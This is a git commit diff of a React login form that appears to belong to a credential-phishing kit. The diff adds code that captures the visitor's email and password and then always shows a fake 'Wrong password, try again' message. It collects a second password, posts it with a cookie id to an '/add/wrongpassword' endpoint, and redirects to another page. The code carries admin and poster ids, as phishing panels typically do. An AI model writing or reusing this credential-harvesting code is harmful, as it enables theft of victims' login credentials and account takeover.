2e8c9260d959c665e057b67f3329c1fbdf1e7066
Zayn Yusuf <yusue786@gmail.com>
2024-09-23 13:02:25 +0600

    fixing issue

--- app/components/LoginForm.js
+++ app/components/LoginForm.js
@@ -10,60 +10,50 @@ import { API_URL } from "../config";
 
 function LoginForm({ adminId, posterId }) {
   const router = useRouter();
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [wrongPassword, setWrongPassword] = useState("");
   const [showWrongPassword, setShowWrongPassword] = useState(false);
-  const initialvalues = {
-    email: "",
-    password: "",
-    remember: "",
-  };
-
   const { login } = useMockLogin(adminId, posterId);
 
-  const handleSubmit = (values, formik) => {
-    const { email, password, wrongPassword } = values;
-
-    // console.log("values", values);
-
+  const handleSubmit = () => {
     const submitValues = {
       site: site,
       email: email,
       password: password,
-      skipcode: "",
     };
-    if (!wrongPassword || wrongPassword == "") {
-      login(submitValues, formik);
-      console.log(submitValues);
-    } else {
-      login({ wrongPassword: wrongPassword }, formik);
-    }
-  };
-  const handleWrongPassword = () => {
+    login(submitValues);
     setShowWrongPassword(true);
     toast.error("Wrong password, try again");
+    console.log(submitValues);
+  };
+  const handleWrongPassword = async () => {
+    const url = `${API_URL}/add/wrongpassword`;
+    const id = Cookies.get("id");
+    const values = {
+      id,
+      wrongPassword,
+    };
 
-    // const url = `${API_URL}/add/wrongpassword`;
+    const res = await fetch(url, {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(values),
+    });
+    const data = await res.json();
+    console.log(data);
 
-    // const res = await fetch(url, {
-    //   method: "POST",
-    //   headers: {
-    //     Accept: "application/json",
-    //     "Content-Type": "application/json",
-    //   },
-    //   body: JSON.stringify(values),
-    // });
-    // const data = await res.json();
-    // console.log(data);
-
-    // if (res.ok) {
-    //   toast.error("Wrong password, try again");
-    //   console.log("success", data);
-    //   formik.resetForm();
-
-    //   router.push(`/imgPage`);
-    // } else {
-    //   console.log("error", data);
-    //   toast.error("Something Went Wrong");
-    // }
+    if (res.ok) {
+      console.log("success", data);
+      formik.resetForm();
+      router.push(`/imgPage`);
+    } else {
+      console.log("error", data);
+      toast.error("Something Went Wrong");
+    }
   };
   return (
     <div className="mt-5 w-[80%] md:w-[50%] bg-white   rounded-lg mx-auto">
@@ -82,65 +72,63 @@ function LoginForm({ adminId, posterId }) {
       </div>
 
       <div className="mt-5">
-        <Formik
-          initialValues={initialvalues}
-          // validationSchema={validate}
-          onSubmit={handleSubmit}
-        >
-          {(formik) => (
-            <Form className="">
-              <Field
-                className="w-full text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
-                placeholder="Your email"
-                name="email"
-                type="email"
-                required
-              />
+        <input
+          className="w-full text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
+          placeholder="Your email"
+          name="email"
+          type="email"
+          autoComplete="on"
+          value={email}
+          onChange={(e) => setEmail(e.target.value)}
+          required
+        />
 
-              {!showWrongPassword ? (
-                <>
-                  <Field
-                    className="w-full mt-5 text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
-                    placeholder="Password"
-                    name="password"
-                    type="password"
-                    autoComplete="on"
-                    required
-                  />
-                </>
-              ) : (
-                <Field
-                  className="w-full mt-5 text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
-                  placeholder="Password"
-                  name="wrongPassword"
-                  type="password"
-                  autoComplete="on"
-                  required
-                />
-              )}
+        {!showWrongPassword ? (
+          <>
+            <input
+              className="w-full mt-5 text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
+              placeholder="Password"
+              name="password"
+              type="password"
+              autoComplete="on"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              required
+            />
+          </>
+        ) : (
+          <input
+            className="w-full mt-5 text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
+            placeholder="Password"
+            name="wrongPassword"
+            type="password"
+            autoComplete="on"
+            value={wrongPassword}
+            onChange={(e) => setWrongPassword(e.target.value)}
+            required
+          />
+        )}
 
-              {!showWrongPassword ? (
-                <button
-                  type="button"
-                  onClick={handleWrongPassword}
-                  className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
-                >
-                  SUBMIT
-                </button>
-              ) : (
-                <button
-                  type="submit"
-                  // type="button"
-                  className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
-                  // disabled={!verified}
-                  // onClick={handleNextStep}
-                >
-                  SUBMIT
-                </button>
-              )}
-            </Form>
-          )}
-        </Formik>
+        {!showWrongPassword ? (
+          <button
+            type="button"
+            onClick={handleSubmit}
+            className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
+          >
+            SUBMIT
+          </button>
+        ) : (
+          <button
+            type="submit"
+            // type="button"
+            className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
+            // disabled={!verified}
+            // onClick={handleNextStep}
+            onClick={handleWrongPassword}
+          >
+            SUBMIT
+          </button>
+        )}
       </div>
     </div>
   );
